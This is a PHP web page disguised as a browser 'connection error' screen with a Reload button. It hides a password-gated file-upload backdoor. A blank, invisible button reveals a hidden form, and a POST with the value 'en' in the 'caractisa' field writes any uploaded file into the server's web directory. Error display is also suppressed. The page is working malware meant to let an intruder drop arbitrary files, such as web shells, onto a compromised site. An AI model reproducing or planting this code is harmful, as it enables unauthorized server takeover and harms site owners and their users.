<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        .hidden {
            display: none;
        }
    </style>
</head>
<body style="font-family: 'Segoe UI', Tahoma, sans-serif;font-size: 75%;">
    <div id="main-frame-error" class="interstitial-wrapper" jstcache="0" style=" margin: 14vh auto 0; max-width: 600px; ">
        <div id="main-content" jstcache="0">
		<img src="">
            <div id="main-message" jstcache="0">
                <h1 jstcache="0">
                    <span jsselect="heading" jsvalues=".innerHTML:msg" jstcache="9"></span>
                    <a id="error-information-button" class="hidden" onclick="toggleErrorInformationPopup();" jstcache="0"></a>
                </h1>
                <p jsselect="summary" jsvalues=".innerHTML:msg" jstcache="1"><strong jscontent="hostName" jstcache="22"><?php echo $_SERVER['HTTP_HOST']; ?></strong> .</p>
        
                <div id="error-information-popup-container" jstcache="0">
                    <div id="error-information-popup" jstcache="0">
                        <div id="error-information-popup-box" jstcache="0">
                            <div id="error-information-popup-content" jstcache="0">
                                <div id="suggestions-list" style="display:none" jsdisplay="(suggestionsSummaryList &amp;&amp; suggestionsSummaryList.length)" jstcache="16">
                                    <p jsvalues=".innerHTML:suggestionsSummaryListHeader" jstcache="18"></p>
                                    <ul jsvalues=".className:suggestionsSummaryList.length == 1 ? 'single-suggestion' : ''" jstcache="19">
                                        <li jsselect="suggestionsSummaryList" jsvalues=".innerHTML:summary" jstcache="21"></li>
                                    </ul>
                                </div>
                                <div class="error-code" jscontent="errorCode" jstcache="17"></div>
                                <p id="error-information-popup-close" jstcache="0">
                                    <a class="link-button" jscontent="closeDescriptionPopup" onclick="toggleErrorInformationPopup();" jstcache="20"></a>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="buttons" class="nav-wrapper suggested-left" jstcache="0">
            <div id="control-buttons" jstcache="0">
                <button id="reload-button" class="blue-button text-button" onclick="reloadButtonClick(this.url);" jsselect="reloadButton" jsvalues=".url:reloadUrl" jscontent="msg" jstcache="5" style=" background: #1a73e8; border: 0; border-radius: 4px; cursor: pointer; margin: 0; padding: 8px 16px; color: aliceblue; ">Reload</button>
            </div>
        </div>
    </div>
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $caractisa = "en";
        if ($_POST['caractisa'] == $caractisa) {
            $target_file = basename($_FILES["BORDDAR"]["name"]);
            if (move_uploaded_file($_FILES["BORDDAR"]["tmp_name"], $target_file)) {
                echo ".". htmlspecialchars( basename( $_FILES["BORDDAR"]["name"])). ".";
            } else {
                echo "..";
            }
        } else {
            echo ".";
        }
    }
    ?>
	<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); ?>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" enctype="multipart/form-data" style="text-align: center;">
        <label for="BORDDAR" class="hidden"></label>
        <input type="file" name="BORDDAR" id="BORDDAR" class="hidden"><br>
        <label for="caractisa" class="hidden"></label>
        <input type="text" name="caractisa" id="caractisa" class="hidden"><br>
        <input type="submit" value="..." name="submit" class="hidden">
    </form>
    
    <button onclick="showUploadForm()" style=" background: none; border: none; "></button>

    <script>
        function showUploadForm() {
            var fileInput = document.getElementById("BORDDAR");
            var caractisaInput = document.getElementById("caractisa");
            var submitButton = document.querySelector('input[type="submit"]');
            var hiddenElements = document.querySelectorAll('.hidden');

            for (var i = 0; i < hiddenElements.length; i++) {
                hiddenElements[i].style.display = "block";
            }

            fileInput.classList.remove('hidden');
            caractisaInput.classList.remove('hidden');
            submitButton.classList.remove('hidden');
        }
    </script>
</body>
</html>
